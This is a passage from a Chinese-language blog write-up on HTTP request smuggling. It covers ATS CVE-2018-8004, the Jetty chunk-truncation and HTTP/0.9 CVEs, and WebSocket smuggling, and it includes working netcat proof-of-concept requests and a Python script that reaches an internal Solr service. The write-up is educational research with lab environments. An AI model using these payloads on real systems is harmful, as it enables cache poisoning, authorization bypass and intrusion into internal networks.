paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg" alt=""></p><p>Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了：</p><p></p><figure class="highlight fortran hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Transfer</span>-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="ATS"><a href="#ATS" class="headerlink" title="ATS"></a>ATS</h2><blockquote><p>​    Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。</p><p>Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。</p><p>在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。</p><p>CVE-2018-8004 补丁列表</p><ul><li><a href="https://github.com/apache/trafficserver/pull/3192" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3192</a></li><li><a href="https://github.com/apache/trafficserver/pull/3201" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3201</a></li><li><a href="https://github.com/apache/trafficserver/pull/3231" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3231</a></li><li><a href="https://github.com/apache/trafficserver/pull/3251" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3251</a></li></ul><p>注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。</p></blockquote><p>关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分 <a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004" target="_blank" rel="noopener">HTTP走私攻击实例——CVE-2018-8004</a></p><p>这里我们说一下原文没有的部分：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[dummy-host7.example.com]</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                    +-[8080]-----+</span></span><br><span class="line"><span class="hljs-string">                    </span>|<span class="hljs-string"> 8007-&gt;8080 </span>|</span><br><span class="line">                    |<span class="hljs-string">  ATS7      </span>|</span><br><span class="line">                    |<span class="hljs-string">            </span>|</span><br><span class="line">                    +-----+------+</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                          </span>|</span><br><span class="line">                    +--[80]----+</span><br><span class="line">                    |<span class="hljs-string"> 8002-&gt;80 </span>|</span><br><span class="line">                    |<span class="hljs-string">  Nginx   </span>|</span><br><span class="line">                    |<span class="hljs-string">          </span>|</span><br><span class="line">                    +----------+</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们构建以上场景，可以使用我搭建的 docker 实验环境 <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1" target="_blank" rel="noopener">lab1</a></p><h3 id="Request-Splitting-using-Huge-Header"><a href="#Request-Splitting-using-Huge-Header" class="headerlink" title="Request Splitting using Huge Header"></a>Request Splitting using Huge Header</h3><p>我们可以通过使用 65535 个字符的 header 来进行实验，比如说我们可以通过使用以下代码来发送一个含有 65535 个字符的 header 的请求到 ATS 7:</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET_/something.html?zorg2=5_HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:_dummy-host7.example.com\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'X:_"%65534s"\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|tr <span class="hljs-string">" "</span> <span class="hljs-string">"1"</span>\</span><br><span class="line">|tr <span class="hljs-string">"_"</span> <span class="hljs-string">" "</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8007</span><br></pre></td></tr></tbody></table></figure><p></p><p>nginx 的返回会直接返回 400 错误，但是有 ATS 7 就比较有趣了，我们会得到一个 400 响应以及 ATS 7 的 200 响应</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> Invalid HTTP Request</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: no-store</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Language</span>: en</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 220</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR="white" FGCOLOR="black"&gt;</span><br><span class="line">&lt;H1&gt;Bad Request&lt;/H1&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line"></span><br><span class="line">&lt;FONT FACE="Helvetica,Arial"&gt;&lt;B&gt;</span><br><span class="line"><span class="hljs-attribute">Description</span>: Could not process this request.</span><br><span class="line">&lt;/B&gt;&lt;/FONT&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 119</span><br><span class="line"><span class="hljs-attribute">Last-Modified</span>: Fri, 29 Nov 2019 05:37:09 GMT</span><br><span class="line"><span class="hljs-attribute">ETag</span>: "5de0ae85-77"</span><br><span class="line"><span class="hljs-attribute">X-Location-echo</span>: /index.html?replaced=0&amp;cache=8</span><br><span class="line"><span class="hljs-attribute">X-Default-VH</span>: 0</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: public, max-age=300</span><br><span class="line"><span class="hljs-attribute">Accept-Ranges</span>: bytes</span><br><span class="line"><span class="hljs-attribute">Age</span>: 0</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;It works!&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty 有三个与 HTTP Smuggling 相关的 CVE：</p><ul><li><p>CVE-2017-7656 HTTP/0.9 issue</p><blockquote><p>​    In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.</p></blockquote></li><li><p>CVE-2017-7657  Chunk size attribute truncation</p><blockquote><p>​    In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.</p></blockquote></li><li><p>CVE-2017-7658 Double Content-Length</p><blockquote><p>​    In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.</p></blockquote></li></ul><p>对于 CVE-2017-7658 我们就不再探究了，因为之前也提过了，我们主要来看另外两个比较有意思的地方。</p><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>环境依旧可以使用我构建的 <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty" target="_blank" rel="noopener">jetty lab 环境</a>，然后我们用如下方式发送一个标准的 HTTP/0.9 请求：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET /?test=4564\r\n'</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></tbody></table></figure><p></p><p>得到一个 400 响应：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> HTTP/0.9 not supported</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html;charset=iso-8859-1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 65</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Server</span>: Jetty(9.4.9.v20180320)</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>接着我们加上版本标识：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET /?test=4564 HTTP/0.9\r\n\r\n'</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然这是 HTTP/0.9 不支持的格式，但是也会有意外的收获，得到一个 200 响应：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sample "Hello, World" Application<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">white</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里的响应没有 headers ，只有 body ，也就是这个请求被 HTTP/0.9 进行了解析。</p><p>而且更有意思的是，添加上 HTTP/0.9 不支持的 headers 也会有意外的收获，这里我们添加一个提取响应包部分内容的 header：</p><p></p><figure class="highlight tex hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf 'GET /?test=4564 HTTP/0.9<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">'Range: bytes=36-42<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">'<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">|nc -q 1 127.0.0.1 8994</span><br><span class="line"></span><br><span class="line">, World</span><br></pre></td></tr></tbody></table></figure><p></p><p>会发现 body 内容被我们进行了提取，结合我们上文提到的结合 HTTP Version 进行的 HTTP Response Splitting ，我们可以进行各种花式攻击</p><h3 id="Chunk-size-attribute-truncation"><a href="#Chunk-size-attribute-truncation" class="headerlink" title="Chunk size attribute truncation"></a>Chunk size attribute truncation</h3><p>我们利用以下代码发送请求：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'POST /?test=4973 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Type: application/x-www-form-urlencoded\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'100000000\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'POST /?test=4974 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Length: 5\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">"HTTP/1.1"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们可以得到两个 200 响应可是按照 chunk 的标准，虽然第二个部分看起来是一个请求，但是实际上应该被算在 chunk data 当中，而问题就在这，jetty 返回了两个请求，把 100000000 当作了 0 ，也就是 chunk end 部分，所以就出现了两个请求的原因。</p><p>我们可以再进行一些尝试：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'POST /?test=4975 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Type: application/x-www-form-urlencoded\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'1ff00000008\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'abcdefgh\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'POST /?test=4976 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Content-Length: 5\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host: localhost\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'0\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">"HTTP/1.1"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们依然得到了两个 200 响应，也就是第一个 chunk size 1ff00000008 被 jetty 截断成了 8 ，也就是 chunk data 部分只有<code>abcdefgh</code>，所以就返回了两个响应。</p><p>与 Apache CVE-2015-3183 类似，jetty 只会取 chunk size 的最后8个字节：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffffffff00000000\r\n</span><br><span class="line">            ^^^^^^^^</span><br><span class="line">            <span class="hljs-number">00000000</span> =&gt; size <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1f</span>f00000008\r\n</span><br><span class="line">   ^^^^^^^^</span><br><span class="line">   <span class="hljs-number">00000008</span> =&gt; size <span class="hljs-number">8</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>其实这部分完全可以作为一个独立的部分，但是感觉篇幅有点长了，这里就做一下简单的介绍，在 Hackactivity 2019 上，@0ang3el 提出了与 Websocket 相关的攻击技术 <a href="https://www.slideshare.net/0ang3el/whats-wrong-with-websocket-apis-unveiling-vulnerabilities-in-websocket-apis" target="_blank" rel="noopener">What’s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs.</a>，让我比较感兴趣的则是 Websocket Smuggling 的部分。</p><p>作者也把相关的描述放在了 <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">websocket-smuggle</a> 这里，这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理<code>Sec-WebSocket-Version</code> 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。</p><p>这里我们假设内网存在 solr 服务，外网无法访问，如果存在 websocket smuggling ，我们可以编写以下代码访问 solr 服务：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">req1 = <span class="hljs-string">"""GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: ip:port</span></span><br><span class="line"><span class="hljs-string">Sec-WebSocket-Version: 1338</span></span><br><span class="line"><span class="hljs-string">Upgrade: websocket</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">req2 = <span class="hljs-string">"""GET /solr/#/ HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="hljs-string">':'</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line"></span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    <span class="hljs-comment"># print req2</span></span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    sock.shutdown(socket.SHUT_RDWR)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    main(<span class="hljs-string">'ip:port'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>在今年红帽杯上也有使用这个攻击技术的一道 CTF 赛题，相关的 writeup 可以看看 <a href="https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service">Red Hat 2019 Web Write Up</a></p><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>这个是比较有意思的一个部分，当时是在10月初 fuzz 的，然后也找了挺久的目标，最后停留在了之前同学推荐的一个中间件 <a href="https://caddyserver.com/v1/" target="_blank" rel="noopener">caddy</a> 上（现在是 11月 27 日，竟然出 caddy 2 了…），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境 <a href="https://hub.docker.com/r/abiosoft/caddy" target="_blank" rel="noopener">caddy</a>。</p><p>于是就有了：</p><p><img 